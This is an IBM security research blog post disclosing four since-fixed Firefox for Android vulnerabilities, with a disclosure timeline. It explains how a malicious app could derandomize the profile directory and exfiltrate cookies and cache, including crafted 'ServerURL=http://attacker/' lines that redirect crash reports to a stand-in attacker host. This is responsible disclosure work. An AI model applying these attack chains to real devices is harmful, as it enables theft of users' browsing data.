[X-Force](https://securityintelligence.com/category/x-force/)](https://securityintelligence.com/category/topics/endpoint/)](https://securityintelligence.com/category/topics/app-security/)

---

We have recently discovered a series of **vulnerabilities in Firefox for Android** that allows a malicious application to leak sensitive information pertaining to the user profile. We developed attacks that first try to determine the random Firefox profile directory name and then exfiltrate sensitive data, such as cookies and cached information, from the derandomized folder, breaking Android’s sandbox.

This blog post describes the vulnerabilities and attacks in an informal manner. The full analysis can be found in our [white paper](http://www.slideshare.net/ibmsecurity/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android "Overtaking Firefox Profiles whitepaper").

# Firefox Profile Directories

Firefox for Android stores the personal data under the profile directory, located at */data/data/org.mozilla.firefox/files/mozilla/<RANDOM-STRING>.default.*

*Randomizing* the profile directory name is a *good*. It provides another layer of defense, preventing unwanted access to this directory in case of Firefox exploitation. Access to this directory should indeed be carefully scrutinized since it contains sensitive information, such as the user cookies, browsing history and cache.

[View on-demand demo on how to pinpoint Vulnerabilities in Android applications](https://securityintelligence.com/events/live-demo-pinpointing-security-vulnerabilities-android-applications-ibm-mobile-dynamic-application-security-testing/)

The generation of the profile directory is done using the following code:

`private static String saltProfileName(String name)

{

 String allowedChars = "abcdefghijklmnopqrstuvwxyz0123456789";

 StringBuilder salt = new StringBuilder(16);`

`for (int i = 0; i < 8; i++)

 {

  salt.append(allowedChars.charAt((int)(Math.random() * allowedChars.length())));

 }`

`salt.append('.');

 salt.append(name);`

`return salt.toString();

}`

So basically it takes a very simple approach. It generates the profile directory name by picking up characters located at 8 random indices in an alphanumeric array:

For example, if the vector of random indices is (0,4,3,1,26,29,4,3), then the generated profile is:

# Vulnerabilities

### (CVE-2014-1516) Profile Directory Name Weak Randomization

The *Math.random()* used by the *saltProfileName* function (which generates the profile directory name) returns a pseudo-random number between 0 and 1.

This method relies on the *java.util.Random* class which is seeded in its default constructor using the following code:

`public Random()

{

 setSeed(System.currentTimeMillis() + System.identityHashCode(this));

}`

If the attacker knows the seed of the Pseudo-Random Number Generator (PRNG), he can predict its output and eventually the generated Firefox Profile name.

For example, if the attacker realizes that the seed is *1036571834*, then he can calculate its corresponding vector of indices, (2,14,26,4,13,27,3,12), by simply initializing *Math.random* with the predicted seed (1036571834) and invoking it 8 times (we haven’t witnessed any call to Math.random before the profile generation, so knowing the seed means knowing the PRNG state).

This vector of indices yields the following profile name:

In the *Math.random* case, the auto-generated seed depends on a couple of values.

1. The current time in milliseconds precision (*System.currentTimeMillis()*).
2. The identity hash code of the Random object (*System.identityHashCode(this)*).

Both factors can somewhat be predicted with the attacker, making a brute-force attack on the unknown bits feasible:

1. Most of the information of the time factor can be leaked.
2. The identity hash code is the Virtual Address (VA) of the Random object in the Dalvik VM heap. Due to [ineffective ASLR in Dalvik apps](http://wenke.gtisc.gatech.edu/papers/morula.pdf), most of the VA bits can be leaked by a malicious application by simply querying its own process.

The conclusion is that *Math.random* is cryptographically insecure and using it results in a predictable Profile Directory name.

### (CVE-2014-1484) Profile Directory Name Leaks to Android System Log

The random Profile Directory Name is written to the Android System Log (*logcat*) in various locations. For instance, upon Profile creation, the following data is written:

`D/GeckoProfile( 4766): Found profile dir: /data/data/org.mozilla.firefox

/files/mozilla/24pd90uh.default`

In Android 4.0 and below, the Android log can easily be read by all apps including malicious ones by acquiring the *READ\_LOGS* permission. Android 4.1 has introduced a change to this behavior to prevent such log leakage attacks: The *READ\_LOG* permissions are no longer required; however, applications can only listen to their own logs. We will next see how a malicious app can manipulate Firefox for Android to leak its own private log in order to overcome this obstacle.

### (CVE-2014-1515) Automatic File Download to SD Card

Any file that cannot be rendered by **Firefox for Android** is automatically downloaded to the SD card (*/mnt/sdcard/Download*), a folder that can be read by a malicious application by acquiring the *READ\_EXTERNAL\_STORAGE* permission. Interestingly, this permission was [not even enforced](http://developer.android.com/reference/android/Manifest.permission.html#READ_EXTERNAL_STORAGE) before Android 4.4. This allows a malicious application to extract non-renderable data such as the cookies database once it has managed to derandomize the profile directory name.

### (CVE-2014-1506) Crash Reporter File Manipulation

The *org.mozilla.gecko.CrashReporter* class is an *exported* activity. Its purpose is to send crash dumps to Mozilla when needed:

When the activity is launched, the following actions take place:

1. The given minidump file is moved to the pending minidumps path: */data/data/org.mozilla.firefox/files/mozilla/Crash Reports/pending.*
2. A meta-data filename is deduced from the given minidump file path, by replacing all ‘.dmp’ occurrences with ‘.extra’.
3. The meta-data file is moved to the pending minidumps path.
4. The meta-data file is parsed as key/value file format. The target server URL (the server that the crash information is sent to) is specified here using the ServerURL key.
5. A crash dialog is presented to the user.

If the user presses the *Close* or *Restart* buttons with the *Send report* check-box enabled, the minidump alongside with other sensitive information is sent to the specified server. It should be noted that, if the user has also checked the *Include the address* check-box, then Android logs are sent as well.

The *CrashReporter* activity consumes the minidump path from the input intent although it should be considered untrusted data since the activity is *exported* in the Android Manifest File. Therefore, a malicious application can control the source path of the moved minidump file and the deduced meta-data file (the *extra* file). We will next see how controlling the minidump Intent extra enables the attacker to extract sensitive information from the application.

# Exploitation

The attacker (by the use of a malicious application) can exploit a subset of the aforementioned vulnerabilities in order to:

1. Determine the profile directory name.
2. Exfiltrate sensitive data (such as cookies and cached information) from the profile directory.

The following are possible exploitation options:

### Option I: Profile Directory Name Weak Randomization + Automatic File Download to SD Card + Crash Reporter File Manipulation (optional).

The attacker can leak most of the bits of the profile directory creation time and the VA of the Random object in order to drastically reduce the set of possible profile names. Afterwards, he can brute-force the candidate profile names in a practical amount of time. The attacker creates a specially crafted world-readable HTML file and commands Firefox to load it (by using an Intent). This file includes the list of candidate profile names ordered by their probabilities. The JavaScript code in the HTML file goes over the list, searching for the correct profile. When there is a match, it can download any file under the profiles directory by creating an *iframe* targeting the filename. As per the automatic download vulnerability, if Firefox cannot render the file, it will automatically download the file to the SD card (/mnt/sdcard/Download), a folder that can be read by the attacker.

The following image shows a successful run of our proof-of-concept exploit. As can be seen, sensitive files have been downloaded to the SD card:

The full exploitation technique and probability analysis can be found in our [white paper](http://www.slideshare.net/ibmsecurity/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android).

### Option II: Profile Directory Name Leaks to Android System Log + Automatic File Download to SD Card + Crash Reporter File Manipulation (optional).

On Android 4.0 and below, the Android System Log can easily be read by all apps including the malicious one, which allows the attacker to deduce the profile directory path.

Android 4.1 has introduced a change to this behavior to prevent such log leakage attacks: The *READ\_LOG* permissions are now not required; however, applications can only listen to their own logs. Since Firefox sends its own private log alongside the crash dump report, the Crash Reporter vulnerability can be exploited for sending the logs to the attacker:

1. The malicious app creates two world-readable files under its data directory: */data/data/malicious app/foo.dmp* with an arbitrary content (can be left empty) and */data/data/malicious app/foo.extra* which contains the attacker’s server, ServerURL=http://attacker/.
2. The malicious app generates an Intent object that targets the *CrashReporter* activity with a *minidumpPath* parameter set to */data/data/malicious app/foo.dmp*
3. After the above actions take place, according to the operation of the *CrashReporter* activity, Firefox will move *foo.dmp* and *foo.extra* from the malicious application’s data directory to the Firefox crash report’s pending path and then parse *foo.extra* for key-value pairs. Since the extra file contains the attacker’s IP as the *ServerURL*, if the user pressed one of the buttons on the CrashReporter dialog, Firefox would send the crash report to the attacker. If the user has also checked the *Include the address* check-box, then Firefox would also append the Android Log output, which contains the Firefox private logs that include the random profile directory name. It should be noted that, since Firefox sends a 200-line window of the log only, the leaked path can be out of that window since it is logged upon Firefox’s launch. In order to make sure that the path is within the window, the attacker can restart Firefox by crashing it. This can be easily done by invoking the CrashReporter activity without a minidumpPath parameter.

Once the attacker has learnt the profile path, he can leak files by exploiting the *Automatic File Download* vulnerability. The attacker simply invokes Firefox using an Intent with a payload set to the target file path.

### Option III: Profile Directory Name Leaks to Android System Log + Crash Reporter File Manipulation.

Here the attacker learns the profile directory name by the exact same technique described in Option II.

Data exfiltration, however, is done by exploiting the *Crash Reporter File Manipulation* vulnerability. The attacker indirectly injects the *ServerURL=http://* string to the target file in order to trick Firefox to use this file as the *minidump* extra. For instance, by using this method, the attacker can leak the cache. First, he opens Firefox (using an Intent) on an attacker’s controlled website, which contains the following string in its HTML body:

`<HTML>

<BODY>

ServerURL=http://attacker/

</BODY>

</HTML>`

After the cache has been prepared, the attacker can leak it by generating another Intent that targets the *CrashReporter* activity, with the *minidump* path parameter set to the cache file. Since the cache file path has no ‘.dmp’ substring, the computed extra file will be the same, and the target server URL will be parsed out of the cache file.

## Fix versions

**CVE-2014-1484** was fixed in Firefox 27 by [MSFA 2014-06](http://www.mozilla.org/security/announce/2014/mfsa2014-06.html).

**CVE-2014-1506** was fixed in Firefox 28 by [MSFA 2014-24](http://www.mozilla.org/security/announce/2014/mfsa2014-24.html).

**CVE-****2014-****1515** was fixed in Firefox 28.0.1 by [MSFA 2014-33](https://www.mozilla.org/security/announce/2014/mfsa2014-33.html).

**CVE-2014-1516** will be fixed in future versions. Because its severity is now much lower with the CVE-2014-1515 fix, we were allowed by Mozilla to publicly disclose this vulnerability.

## Disclosure Timeline

**03/25/2014** Public disclosure.

**03/25/2014** Firefox 28.0.1 is released (CVE-2014-1515 [fix](https://www.mozilla.org/security/announce/2014/mfsa2014-33.html)).

**03/18/2014** Firefox 28 is released (CVE-2014-1506 [fix](http://www.mozilla.org/security/announce/2014/mfsa2014-24.html)).

**03/15/2014** Permission granted.

**03/12/2014** Requested permission to disclose CVE-2014-1516 despite missing fix.

**02/14/2014** Firefox 27 is released (CVE-2014-1484 [fix](http://www.mozilla.org/security/announce/2014/mfsa2014-06.html)).

**11/28/2013** Reported vulnerabilities to Mozilla.

## About the IBM Application Security Research Group

The Application Security Research Group researches new security threats and vulnerabilities and provides regular rule updates to AppScan.

[Live demo on June 11th on how to Pinpoint Security Vulnerabilities in Android Applications](https://securityintelligence.com/events/live-demo-pinpointing-security-vulnerabilities-android-applications-ibm-mobile-dynamic-application-security-testing/)

[Android](https://securityintelligence.com/tag/android/) | [Application Security](https://securityintelligence.com/tag/application-security/) | [Firefox](https://securityintelligence.com/tag/firefox/) | [Mobile Security](https://securityintelligence.com/tag/mobile-security/) | [Technical & Product](https://securityintelligence.com/tag/technical-product/) | [Vulnerabilities](https://securityintelligence.com/tag/vulnerabilities/)

[Roee Hay](https://securityintelligence.com/author/roee-hay/)
X-Force Application Security Research Team Leader, IBM Security

POPULAR

[Risk Management](https://securityintelligence.com/category/topics/risk-management/)

November 6, 2024

[## What Telegram’s recent policy shift means for cyber crime

  4 min read - Since its launch in August 2013, Telegram has become the go-to messaging app for privacy-focused users. To start using the app, users can sign up using either their real phone number or an anonymous number purchased from the Fragment blockchain…](https://securityintelligence.com/articles/what-telegrams-recent-policy-shift-means-for-cyber-crime/)

[Artificial Intelligence](https://securityintelligence.com/category/topics/artificial-intelligence/)

January 17, 2025

[## How to calculate your AI-powered cybersecurity’s ROI

  4 min read - Imagine this scenario: A sophisticated, malicious phishing campaign targets a large financial institution. The attackers use emails generated by artificial intelligence (AI) that closely mimic the company’s internal communications. The emails contain malicious links designed to steal employee credentials, which…](https://securityintelligence.com/articles/how-to-calculate-your-ai-powered-cybersecurity-roi/)

[Cloud Security](https://securityintelligence.com/category/topics/cloud-protection/)

January 22, 2025

[## 2024 Cloud Threat Landscape Report: How does cloud security fail?

  4 min read - Organizations often set up security rules to help reduce cybersecurity vulnerabilities and risks. The 2024 Cost of a Data Breach Report discovered that 40% of all data breaches involved data distributed across multiple environments, meaning that these best-laid plans often…](https://securityintelligence.com/articles/2024-cloud-threat-landscape-report-how-does-cloud-security-fail/)

### More from Application Security

November 26, 2024

[## What’s up India? PixPirate is back and spreading via WhatsApp

  8 min read - This blog post is the continuation of a previous blog regarding PixPirate malware. If you haven’t read the initial post, please take a couple of minutes to get caught up before diving into this content. PixPirate malware consists of two components: a downloader application and a droppee application, and both are custom-made and operated by the same fraudster group. Although the traditional role of a downloader is to install the droppee on the victim device, with PixPirate, the downloader also…](https://securityintelligence.com/posts/pixpirate-back-spreading-via-whatsapp/)

March 13, 2024

[## PixPirate: The Brazilian financial malware you can’t see

  10 min read - Malicious software always aims to stay hidden, making itself invisible so the victims can’t detect it. The constantly mutating PixPirate malware has taken that strategy to a new extreme. PixPirate is a sophisticated financial remote access trojan (RAT) malware that heavily utilizes anti-research techniques. This malware’s infection vector is based on two malicious apps: a downloader and a droppee. Operating together, these two apps communicate with each other to execute the fraud. So far, IBM Trusteer researchers have observed this…](https://securityintelligence.com/posts/pixpirate-brazilian-financial-malware/)

March 5, 2024

[## From federation to fabric: IAM’s evolution

  15 min read - In the modern day, we’ve come to expect that our various applications can share our identity information with one another. Most of our core systems federate seamlessly and bi-directionally. This means that you can quite easily register and log in to a given service with the user account from another service or even invert that process (technically possible, not always advisable). But what is the next step in our evolution towards greater interoperability between our applications, services and systems?Identity and…](https://securityintelligence.com/posts/identity-and-access-management-evolution/)

## Topic updates

Get email updates and stay ahead of the latest threats to the security landscape, thought leadership and research.

Subscribe today

Analysis and insights from hundreds of the brightest minds in the cybersecurity industry to help you prove compliance, grow business and stop threats.

[Cybersecurity News](/news/)
[By Topic](/category/topics/)
[By Industry](/category/industries/)
[Exclusive Series](/series/)
[X-Force](/x-force/)
[Podcast](/media/)
[Events](/events/)
[Contact](/about-us/)
[About Us](/about-us/)

Follow us on social

[© 2025 IBM](http://www.ibm.com?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)
[Contact](https://www.ibm.com/contact/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)
[Privacy](https://www.ibm.com/privacy/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)
[Terms of use](https://www.ibm.com/legal/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US&cm_mc_uid=03001744655915532865554&cm_mc_sid_50200000=84159441565120380187)
[Accessibility](https://www.ibm.com/accessibility/?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)
Cookie Preferences

[Sponsored by

si-icon-eightbarfeature](http://ibm.com/security?ce=ISM0484&ct=SWG&cmp=IBMSocial&cm=h&cr=Security&ccy=US)


